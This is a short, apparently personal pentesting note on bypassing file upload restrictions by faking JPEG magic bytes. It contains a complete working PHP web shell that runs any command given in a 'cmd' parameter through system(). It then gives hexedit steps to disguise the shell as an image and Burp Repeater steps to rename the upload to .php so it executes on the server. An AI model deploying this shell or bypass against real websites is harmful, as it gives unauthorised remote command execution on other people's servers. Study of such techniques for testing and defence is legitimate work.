## **Overview**

Magic Bytes are Basically strings that indicates a file type. You can check out a bunch of them [here](https://en.wikipedia.org/wiki/List_of_file_signatures?ref=danielxblack.ghost.io).



## **Exploitation**


- create a file with `.php.jpg` as the extension 
- Input the following code into the file and save it

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

- Since in this case we are uploading a `JPG` or `PNG` file, Files like this usually have one of the following magic numbers: `FFD8 DDE0`, `FFD8 FFDB` or `FFD8 FFE1`
- We can then change the first bytes and the last bytes using **hexedit** - `hexedit shell.php`
	- First bytes will be: `FFD8 FFDB`
	- Last bytes will be: `FFD9` (Always have to be)
	- Ctrl+S - To save

![](https://i.imgur.com/KsVAtWP.png)

- Open up burp suite and try to upload this file then intercept request
- Forward request to **Repeater** and rename to **anything.php** then click **Send**

 ![](https://i.imgur.com/J8fdr1b.png)

- Checking back on the website our file should have been uploaded

![](https://i.imgur.com/2Wx4lFa.png)


![](https://i.imgur.com/j1wMNmy.png)


### **Reference**

- [https://danielxblack.ghost.io/bypassing-file-upload-restrictions-with-a-magic-byte-and-hex-editor/](https://danielxblack.ghost.io/bypassing-file-upload-restrictions-with-a-magic-byte-and-hex-editor/)

